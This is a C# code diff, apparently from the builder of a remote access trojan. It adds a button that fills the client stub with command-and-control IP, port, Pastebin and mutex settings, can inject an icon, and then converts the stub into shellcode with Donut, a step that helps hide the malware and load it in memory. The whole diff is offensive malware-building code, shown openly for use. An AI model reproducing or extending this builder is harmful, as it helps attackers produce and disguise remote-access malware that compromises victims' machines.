@@ -14,6 +14,7 @@ using dnlib.DotNet.Emit;
 using System.Threading.Tasks;
 using System.Diagnostics;
 using Toolbelt.Drawing;
+using Server.Helper.Donut;
 
 namespace Server.Forms
 {
@@ -203,6 +204,7 @@ namespace Server.Forms
                     saveFileDialog1.FileName = "Client";
                     if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                     {
+                        btnShellcode.Enabled = false;
                         btnBuild.Enabled = false;
                         WriteSettings(asmDef, saveFileDialog1.FileName);
                         asmDef.Write(saveFileDialog1.FileName);
@@ -496,6 +498,57 @@ namespace Server.Forms
                     txtFileVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                     txtProductVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                 }
+            }
+        }
+
+        private void btnShellcode_Click(object sender, EventArgs e)
+        {
+            if (!chkPaste_bin.Checked && listBoxIP.Items.Count == 0 || listBoxPort.Items.Count == 0) return;
+            if (checkBox1.Checked)
+            {
+                if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
+                if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
+            }
+            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = getRandomCharacters();
+            if (chkPaste_bin.Checked && string.IsNullOrWhiteSpace(txtPaste_bin.Text)) return;
+            ModuleDefMD asmDef = null;
+            try
+            {
+                using (asmDef = ModuleDefMD.Load(@"Stub/Client.exe"))
+                {
+                    string Temppath = Path.Combine(Application.StartupPath, @"Stub\tempClient.exe"); ;
+                    if (File.Exists(Temppath)) 
+                    {
+                        File.Delete(Temppath);
+                    }
+                    
+                    File.Copy(Path.Combine(Application.StartupPath, @"Stub\Client.exe"), Temppath);
+                    btnShellcode.Enabled = false;
+                    btnBuild.Enabled = false;
+                    WriteSettings(asmDef, Temppath);
+                    asmDef.Write(Temppath);
+                    asmDef.Dispose();
+                    if (btnAssembly.Checked)
+                    {
+                        WriteAssembly(Temppath);
+                    }
+                    if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
+                    {
+                        IconInjector.InjectIcon(Temppath, txtIcon.Text);
+                    }
+                    Donut.Creat(Temppath);
+                    File.Delete(Temppath);
+                    MessageBox.Show("Done!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    SaveSettings();
+                    this.Close();
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                asmDef?.Dispose();
+                btnBuild.Enabled = true;
+
             }
         }
     }
